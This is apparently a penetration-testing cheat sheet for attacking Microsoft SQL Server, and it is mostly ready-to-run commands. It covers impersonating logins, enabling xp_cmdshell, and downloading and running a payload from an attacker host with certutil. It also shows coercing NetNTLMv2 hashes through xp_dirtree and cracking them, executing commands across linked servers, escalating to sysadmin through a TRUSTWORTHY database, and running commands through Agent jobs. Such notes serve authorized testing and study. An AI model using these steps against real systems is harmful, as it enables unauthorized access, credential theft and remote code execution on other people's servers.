# MSSQL: enumeration and access

`connect → identity/rights → data → impersonation/links → OS context → enumerate again`

[Connect](#connect) · [Impersonation](#login-and-user-impersonation) · [xp_cmdshell](#xp_cmdshell) · [Linked servers](#linked-servers) · [AD follow-up](#service-account-and-ad-follow-up)

## Find the instance
Named instances use other/dynamic ports; SQL Browser is UDP/1434. No Browser reply ≠ no SQL Server.

```bash
nmap -Pn -sV -p <PORT> --script ms-sql-info,ms-sql-ntlm-info \
  --script-args mssql.instance-port=<PORT>,mssql.scanned-ports-only=true <IP>
sudo nmap -Pn -sU -p 1434 --script ms-sql-info <IP>
```
```powershell
setspn.exe -Q MSSQLSvc/*
Test-NetConnection -ComputerName '<FQDN>' -Port <PORT>
```
- SPN → host/instance/port + owning account; user-backed SPN → [Kerberoasting](../ad/authentication.md#kerberoasting). SPNs can be stale.

## Connect
SQL auth = instance login (`sa`). Windows auth = domain account that has a SQL login mapping.

```bash
# SQL login
impacket-mssqlclient -port <PORT> '<USER>@<IP>'
# Windows/domain login
impacket-mssqlclient -windows-auth -port <PORT> '<DOMAIN>/<USER>@<IP>'
# NT hash (NTLM)
impacket-mssqlclient -windows-auth -hashes ':<NT>' -port <PORT> '<DOMAIN>/<USER>@<IP>'
# Kerberos cache (use the SQL FQDN)
export KRB5CCNAME=<USER>.ccache
impacket-mssqlclient -k -no-pass -dc-ip <DC-IP> -target-ip <IP> \
  -port <PORT> '<DOMAIN.TLD>/<USER>@<FQDN>'
```
- Kerberos: SPN `MSSQLSvc/<FQDN>:<PORT>`, DNS, clock. [tickets](../ad/tickets.md) · [fixes](../ad/kerberos-troubleshooting.md)
- SQL `password_hash` and NetNTLMv2 are not NT hashes.

```bash
nxc mssql <IP> --port <PORT> -d <DOMAIN> -u <USER> -p '<PW>' \
  --query "SELECT SYSTEM_USER, DB_NAME(), IS_SRVROLEMEMBER('sysadmin');"
nxc mssql <IP> --port <PORT> --local-auth -u <USER> -p '<PW>' \
  --query "SELECT SYSTEM_USER, DB_NAME(), IS_SRVROLEMEMBER('sysadmin');"
```
- nxc defaults to Windows auth; `--local-auth` = SQL auth.

```cmd
sqlcmd -S "tcp:<FQDN>,<PORT>" -E
sqlcmd -S "tcp:<FQDN>,<PORT>" -U <USER>
```
- Impacket runs one line per statement: join wrapped statements/variable blocks into one line. `sqlcmd` needs `GO` on its own line. `! <cmd>` in Impacket runs on Kali.

```text
enum_db
enum_logins
enum_users
enum_owner
enum_impersonate
enum_links
```

## Identity and rights
```sql
SELECT @@SERVERNAME AS server_name, @@VERSION AS version;
SELECT ORIGINAL_LOGIN() AS original_login, SYSTEM_USER AS current_login, USER_NAME() AS database_user, DB_NAME() AS current_database;
SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin, IS_ROLEMEMBER('db_owner') AS is_db_owner;
SELECT * FROM sys.fn_my_permissions(NULL, 'SERVER');
SELECT * FROM sys.fn_my_permissions(NULL, 'DATABASE');
SELECT name, type, usage FROM sys.login_token;
SELECT name, type, usage FROM sys.user_token;
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U','G');
SELECT name, type_desc FROM sys.database_principals WHERE type IN ('S','U','G');
SELECT name, state_desc, HAS_DBACCESS(name) AS can_access, SUSER_SNAME(owner_sid) AS owner, is_trustworthy_on FROM sys.databases;
```
- Role function: `1` member, `0` not, `NULL` unresolved. Metadata visibility can hide principals.

| Finding | Next |
| --- | --- |
| Readable app database | Tables, rows, configs, creds |
| `IMPERSONATE` / `IMPERSONATE ANY LOGIN` | Exact target + its permissions |
| `CONTROL SERVER` / `sysadmin` | [xp_cmdshell](#xp_cmdshell), then check Windows identity |
| `ALTER SETTINGS` | Can reconfigure; execute right is separate |
| `db_owner` | This DB only; check owner + `TRUSTWORTHY` |
| Linked server | Direction, login mapping, RPC Out |
| Bulk/OLE/Agent rights | [File access](#file-access), [Agent](#sql-server-agent) |

## Readable data
```sql
USE [<DATABASE>];
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<TABLE>';
SELECT TOP (10) [<COLUMN1>], [<COLUMN2>] FROM [<SCHEMA>].[<TABLE>];
```
```sql
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME
FROM INFORMATION_SCHEMA.COLUMNS
WHERE COLUMN_NAME LIKE '%pass%' OR COLUMN_NAME LIKE '%secret%' OR COLUMN_NAME LIKE '%token%' OR COLUMN_NAME LIKE '%connection%';
```
```sql
SELECT SCHEMA_NAME(schema_id) AS schema_name, name, type_desc FROM sys.objects WHERE type IN ('V','P');
SELECT OBJECT_DEFINITION(OBJECT_ID(N'<SCHEMA>.<PROCEDURE>')) AS definition;
SELECT name, base_object_name FROM sys.synonyms;
```
- Empty → check current DB, schema, `SELECT`/`VIEW DEFINITION`. Test found creds: [lateral movement](../ad/lateral-movement.md).

## Login and user impersonation
`major_id` = target login; the grantor is who issued the grant.

```sql
SELECT grantee.name AS grantee, target.name AS target_login, p.state_desc
FROM sys.server_permissions AS p
JOIN sys.server_principals AS grantee ON p.grantee_principal_id = grantee.principal_id
JOIN sys.server_principals AS target ON p.major_id = target.principal_id
WHERE p.class_desc = 'LOGIN' AND p.permission_name = 'IMPERSONATE';
```
Effective rights (includes inherited):

```sql
SELECT name AS target_login, HAS_PERMS_BY_NAME(name, 'LOGIN', 'IMPERSONATE') AS can_impersonate
FROM sys.server_principals WHERE type IN ('S','U') AND is_disabled = 0;
SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'IMPERSONATE ANY LOGIN') AS impersonate_any_login;
```
Switch, recheck identity/rights/links:

```sql
EXECUTE AS LOGIN = '<TARGET-LOGIN>';
SELECT ORIGINAL_LOGIN(), SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM sys.fn_my_permissions(NULL, 'SERVER');
REVERT;
SELECT ORIGINAL_LOGIN(), SYSTEM_USER, USER_NAME();
```
Database user:

```sql
USE [<DATABASE>];
SELECT name, HAS_PERMS_BY_NAME(name, 'USER', 'IMPERSONATE') AS can_impersonate FROM sys.database_principals WHERE type IN ('S','U');
EXECUTE AS USER = '<DATABASE-USER>';
SELECT SYSTEM_USER, USER_NAME(), IS_ROLEMEMBER('db_owner');
SELECT * FROM sys.fn_my_permissions(NULL, 'DATABASE');
REVERT;
```
- Chains possible; each `REVERT` pops one level, so do the work first.
- `EXECUTE AS USER` is DB-scoped: `dbo` ≠ server rights. No Windows token or password is gained.
- Impacket: `exec_as_login` / `exec_as_user`.

## xp_cmdshell
```sql
SELECT name, value, value_in_use FROM sys.configurations WHERE name IN ('show advanced options','xp_cmdshell');
SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'ALTER SETTINGS') AS can_change_options;
USE master;
SELECT HAS_PERMS_BY_NAME('dbo.xp_cmdshell', 'OBJECT', 'EXECUTE') AS can_execute;
```
Enable (needs `ALTER SETTINGS`), then run:

```sql
EXEC master.sys.sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC master.sys.sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC master.dbo.xp_cmdshell 'whoami';
EXEC master.dbo.xp_cmdshell 'whoami /priv';
EXEC master.dbo.xp_cmdshell 'hostname';
```
- Runs as the service account (sysadmin) or `##xp_cmdshell_proxy_account##` (non-sysadmin) → check `SeImpersonate` ([potato](../windows/potato.md)). `sa` ≠ SYSTEM.

Payload (start HTTP server + listener first; [transfer](../foothold/file-transfer.md), [shells](../foothold/shells.md)):

```sql
EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<KALI>:8000/<PAYLOAD>.exe C:\Windows\Temp\<PAYLOAD>.exe';
EXEC master.dbo.xp_cmdshell 'C:\Windows\Temp\<PAYLOAD>.exe';
```
- The call blocks until the process exits.

Undo (assumes both were `0`):

```sql
EXEC master.sys.sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC master.sys.sp_configure 'show advanced options', 0; RECONFIGURE;
```

## UNC path → NetNTLMv2
`xp_dirtree` needs neither `sysadmin` nor `xp_cmdshell`.

```bash
mkdir -p /tmp/mssql-capture
sudo impacket-smbserver -smb2support share /tmp/mssql-capture
```
```sql
EXEC master.dbo.xp_dirtree '\\<KALI>\share', 1, 1;
```
```bash
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat --show -m 5600 netntlmv2.txt
```
- NetNTLMv2 is crack-only, it can't be passed. Machine-account responses rarely crack.
- No hit → procedure rights, SQL host → KALI TCP/445, NTLM policy.
- Relay needs signing/channel-binding off on target: [NTLM](../windows/ntlm.md) · [capture](../windows/ntlm-capture.md)

## Linked servers
```sql
EXEC master.sys.sp_linkedservers;
SELECT name, product, provider, data_source, is_data_access_enabled, is_rpc_out_enabled FROM sys.servers WHERE is_linked = 1;
EXEC master.sys.sp_helplinkedsrvlogin;
```
Read (data access on; double the inner quotes):

```sql
SELECT * FROM OPENQUERY([<LINK>], 'SELECT @@SERVERNAME AS server_name, SYSTEM_USER AS login_name, USER_NAME() AS database_user, IS_SRVROLEMEMBER(''sysadmin'') AS is_sysadmin');
SELECT * FROM OPENQUERY([<LINK>], 'SELECT name FROM sys.databases');
SELECT * FROM [<LINK>].[<DATABASE>].[<SCHEMA>].[<TABLE>];
```
Batches (RPC Out on):

```sql
EXEC ('SELECT @@SERVERNAME, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'');') AT [<LINK>];
EXEC ('SELECT name, value, value_in_use FROM sys.configurations WHERE name IN (''show advanced options'',''xp_cmdshell'');') AT [<LINK>];
EXEC ('EXEC master.dbo.xp_cmdshell ''whoami'';') AT [<LINK>];
```
- Remote `xp_cmdshell` off → run the [enable steps](#xp_cmdshell) through the link.
- The SQL host connects, so links may reach hosts Kali can't.

RPC Out off (needs `ALTER ANY LINKED SERVER` on the **source**; save `is_rpc_out_enabled` first):

```sql
EXEC master.sys.sp_serveroption @server=N'<LINK>', @optname=N'rpc out', @optvalue=N'true';
```
- Undo with `N'false'` only if you enabled it.

### More than one hop
RPC Out needed at each hop.

```text
show_query
use_link [<LINK-A>]
enum_links
use_link [<LINK-B>]
```
```sql
EXEC ('EXEC (''SELECT @@SERVERNAME AS server_name, SYSTEM_USER AS login_name;'') AT [<LINK-B>];') AT [<LINK-A>];
```
- `use_link ..` steps back; `use_link localhost` clears the chain.
- At each hop rerun `SELECT @@SERVERNAME, SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');`. Return links may map to different rights.

## db_owner + TRUSTWORTHY
Need all three: `db_owner` here, `TRUSTWORTHY=ON`, owner is `sysadmin`.

```sql
USE [<DATABASE>];
SELECT IS_ROLEMEMBER('db_owner') AS is_db_owner;
SELECT name, is_trustworthy_on, SUSER_SNAME(owner_sid) AS owner, IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(owner_sid)) AS owner_is_sysadmin FROM sys.databases WHERE name = DB_NAME();
```
```sql
CREATE PROCEDURE dbo.[<UNIQUE-PROC>] WITH EXECUTE AS OWNER AS ALTER SERVER ROLE [sysadmin] ADD MEMBER [<ORIGINAL-LOGIN>];
```
- Run as its own batch (`GO` in `sqlcmd`), as the original login.

```sql
EXEC dbo.[<UNIQUE-PROC>];
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
DROP PROCEDURE dbo.[<UNIQUE-PROC>];
```
Undo (persistent otherwise):

```sql
ALTER SERVER ROLE [sysadmin] DROP MEMBER [<ORIGINAL-LOGIN>];
```
- `msdb` is trustworthy by default; still check your role and the owner.

## File access
### Read a known file
Runs as the service account (SQL auth) or caller's Windows context (Windows auth).

```sql
SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'ADMINISTER BULK OPERATIONS') AS server_bulk;
SELECT HAS_PERMS_BY_NAME(DB_NAME(), 'DATABASE', 'ADMINISTER DATABASE BULK OPERATIONS') AS database_bulk;
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS file_data;
SELECT BulkColumn FROM OPENROWSET(BULK '<PATH>', SINGLE_CLOB) AS file_data;
```
- Path is on the SQL host. `SINGLE_NCLOB` = Unicode, `SINGLE_BLOB` = bytes.

### Write with OLE Automation
Needs `sysadmin` (or grants) + writable path.

```sql
SELECT name, value, value_in_use FROM sys.configurations WHERE name IN ('show advanced options','Ole Automation Procedures');
EXEC master.sys.sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC master.sys.sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
```
One batch (the `0` = don't overwrite):

```sql
DECLARE @fs int, @file int, @hr int;
EXEC @hr = master.dbo.sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT;
IF @hr = 0 EXEC @hr = master.dbo.sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\Windows\Temp\<UNIQUE-MARKER>.txt', 0;
IF @hr = 0 EXEC @hr = master.dbo.sp_OAMethod @file, 'WriteLine', NULL, 'MSSQL_WRITE_CHECK';
IF @hr = 0 EXEC @hr = master.dbo.sp_OAMethod @file, 'Close';
SELECT @hr AS hresult;
IF @file IS NOT NULL EXEC master.dbo.sp_OADestroy @file;
IF @fs IS NOT NULL EXEC master.dbo.sp_OADestroy @fs;
```
```sql
EXEC master.sys.sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;
EXEC master.sys.sp_configure 'show advanced options', 0; RECONFIGURE;
```
- `hresult=0` = OK; nonzero → check failing call, COM, path ACL.

## SQL Server Agent
Agent account can differ from the engine account.

```sql
SELECT servicename, status_desc, service_account FROM sys.dm_server_services;
SELECT name, enabled, SUSER_SNAME(owner_sid) AS owner FROM msdb.dbo.sysjobs;
SELECT j.name, s.step_id, s.subsystem, s.command FROM msdb.dbo.sysjobs AS j JOIN msdb.dbo.sysjobsteps AS s ON j.job_id = s.job_id;
```
- `sys.dm_server_services` needs `VIEW SERVER STATE` (`VIEW SERVER SECURITY STATE` on 2022+). SQL Express has no Agent.

Sysadmin job (output path must be Agent-writable):

```sql
USE msdb;
EXEC dbo.sp_add_job @job_name=N'<UNIQUE-JOB>';
EXEC dbo.sp_add_jobstep @job_name=N'<UNIQUE-JOB>', @step_name=N'identity', @subsystem=N'CmdExec', @command=N'cmd /c whoami > C:\Windows\Temp\<UNIQUE-JOB>.txt';
EXEC dbo.sp_add_jobserver @job_name=N'<UNIQUE-JOB>';
EXEC dbo.sp_start_job @job_name=N'<UNIQUE-JOB>';
EXEC dbo.sp_help_job @job_name=N'<UNIQUE-JOB>';
```
Start is async; then read and clean up:

```sql
EXEC msdb.dbo.sp_help_jobhistory @job_name=N'<UNIQUE-JOB>';
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\Temp\<UNIQUE-JOB>.txt', SINGLE_CLOB) AS job_output;
EXEC msdb.dbo.sp_delete_job @job_name=N'<UNIQUE-JOB>';
```

## Service account and AD follow-up
```sql
EXEC master.dbo.xp_cmdshell 'whoami /all';
EXEC master.dbo.xp_cmdshell 'ipconfig /all';
EXEC master.dbo.xp_cmdshell 'netstat -ano';
```

| Identity / lead | Next |
| --- | --- |
| Domain service account | Groups, shares, SPNs, ACLs, remote services |
| Virtual account / NetworkService / SYSTEM | Network auth is `<HOST>$` |
| `SeImpersonate` / `SeAssignPrimaryToken` | [Potato](../windows/potato.md) |
| Local admin / SYSTEM | [Credential access](../windows/credential-access.md) |
| App config / job command | Creds → test reuse |
| Internal SQL instance | [Pivot](../06-pivoting.md), repeat checks |
| Service-account key | Silver ticket: [tickets](../ad/tickets.md) |

- Then [Windows enum](../windows/enumeration.md) · [AD enum](../ad/active-directory-enum.md). SQL impersonation gives no Windows credential for a second hop.

## Quick fixes
| Problem | Check |
| --- | --- |
| Login failed | SQL vs Windows auth, domain, login mapping, port, disabled |
| Cannot open default database | Impacket `-db master` |
| Certificate/encryption error | Read exact error; tool help |
| Partial statements / lost variables (Impacket) | One line per statement/block |
| Empty permission results | Context, metadata visibility, `NULL` |
| Impersonation listed but fails | Target vs grantor, deny, DB vs server scope |
| Linked server not configured for RPC | RPC Out on source; `OPENQUERY` may still read |
| Linked login fails / anonymous logon | Login mapping, delegation, route |
| Remote impersonation lost | Separate RPC batches reset it; use one batch |
| `xp_cmdshell` denied | Option state, execute right, sysadmin/proxy |
| Runs but no callback | Route to KALI, file integrity, AV |
| Bulk/OLE denied | SQL permission, OS identity, path ACL |
| Agent job no result | Job history, proxy, Agent account, output path |

## Cleanup
- Save `value` + `value_in_use` before `sp_configure`; revert impersonation; remove only your own procs, jobs, roles, files.
